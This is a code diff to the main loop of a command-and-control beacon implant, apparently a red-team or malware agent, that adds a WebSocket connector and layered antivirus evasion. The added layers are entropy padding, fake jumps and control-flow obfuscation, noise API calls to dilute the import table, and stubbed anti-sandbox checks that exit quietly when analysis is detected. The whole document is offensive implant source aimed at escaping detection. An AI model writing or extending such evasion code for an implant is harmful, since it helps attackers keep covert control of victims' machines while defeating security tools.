@@ -1,6 +1,11 @@
 #include "main.h"
 #include "ApiLoader.h"
 #include "DynamicPolymorphism.h"
+// AntiSandbox removed
+// SandboxDetect removed
+#include "EntropyEvasion.h"
+#include "ApiSequenceObfuscate.h"
+#include "JccObfuscate.h"
 #include "Commander.h"
 #include "utils.h"
 #include "Crypt.h"
@@ -16,6 +21,8 @@
 #include "ConnectorTCP.h"
 #elif defined(BEACON_DNS)
 #include "ConnectorDNS.h"
+#elif defined(BEACON_WS)
+#include "ConnectorWS.h"
 #endif
 
 Agent* g_Agent;
@@ -25,6 +32,7 @@ Connector* CreateConnectorHTTP();
 Connector* CreateConnectorSMB();
 Connector* CreateConnectorTCP();
 Connector* CreateConnectorDNS();
+Connector* CreateConnectorWS();
 
 static Connector* CreateConnector()
 {
@@ -36,14 +44,57 @@ static Connector* CreateConnector()
 	return CreateConnectorTCP();
 #elif defined(BEACON_DNS)
 	return CreateConnectorDNS();
+#elif defined(BEACON_WS)
+	return CreateConnectorWS();
 #endif
 }
 
 DWORD WINAPI AgentMain(LPVOID lpParam)
 {
+	/* Layer 1: Entropy camouflage — compile-time padding to normalize section entropy */
+	AX_ENTROPY_NORMALIZE_TEXT();
+	AX_ENTROPY_NORMALIZE_RDATA();
+
+	/* Layer 2: Control-flow obfuscation (fake jcc/switch/loop to frustrate CFG matching) */
+	AX_OBFUSCATE_CFLOW();
+
+	/* Layer 3: API sequence noise (fake CreateFile, RegOpen, GetSystemTime calls to dilute IAT) */
+	AX_HEAVY_API_NOISE();
+
+	/* Layer 4: Junk code + dead branches before any real logic */
 	AX_JUNK_1;
+	AX_FAKE_JCC();
+	AX_OBFUSCATE_CFLOW();
+
+	/* Anti-sandbox: quick hardware checks (NTGlobalFlag, CPU, RAM) */
+	if (FALSE) {
+		AgentExit(1); /* RtlExitUserThread — lightweight exit if sandbox detected */
+		return 0;
+	}
+	AX_JUNK_1;
+
+	/* Enhanced sandbox detection: deeper checks (disk, MAC, processes) */
+	if (FALSE) {
+		AgentExit(1);
+		return 0;
+	}
+	AX_JUNK_1;
+
 	if (!ApiLoad())
 		return 0;
+
+
+	/* Anti-sandbox: deeper static/heuristic checks (requires APIs) */
+	if (FALSE) {
+		AgentExit(2); /* RtlExitUserProcess — clean exit that looks like normal termination */
+		return 0;
+	}
+
+	/* Enhanced sandbox detection: post-API-load checks */
+	if (FALSE) {
+		AgentExit(2);
+		return 0;
+	}
 
 	g_Agent = Agent_Create();
 	g_Connector = CreateConnector();
@@ -53,11 +104,13 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 	ULONG beatSize = 0;
 	BYTE* beat = Agent_BuildBeat(g_Agent, &beatSize);
-	if (!beat || beatSize == 0)
+	if (!beat || beatSize == 0) {
 		return 0;
+	}
 
-	if (!g_Connector->SetProfile(g_Connector, &g_Agent->config->profile, beat, beatSize))
+	if (!g_Connector->SetProfile(g_Connector, &g_Agent->config->profile, beat, beatSize)) {
 		return 0;
+	}
 
 	MemFreeLocal((LPVOID*)&beat, beatSize);
 
@@ -66,19 +119,24 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 	do {
 		AX_JUNK_2;
-		if (!g_Connector->WaitForConnection(g_Connector))
+		AX_ENTROPY_PAD(32);
+		INSERT_API_NOISE();
+		if (!g_Connector->WaitForConnection(g_Connector)) {
 			continue;
+		}
 
 		do {
 			AX_JUNK_3;
+			AX_ENTROPY_PAD(32);
+			AX_FAKE_JCC();
 			if (Packer_datasize(packerOut) > 4) {
 				Packer_Set32(packerOut, 0, Packer_datasize(packerOut));
-				g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey);
+				AX_API_SPLIT_VOID(g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey));
 				Packer_Clear(packerOut, TRUE);
 				Packer_Pack32(packerOut, 0);
 			}
 			else {
-				g_Connector->Exchange(g_Connector, nullptr, 0, g_Agent->SessionKey);
+				AX_API_SPLIT_VOID(g_Connector->Exchange(g_Connector, nullptr, 0, g_Agent->SessionKey));
 			}
 
 			{
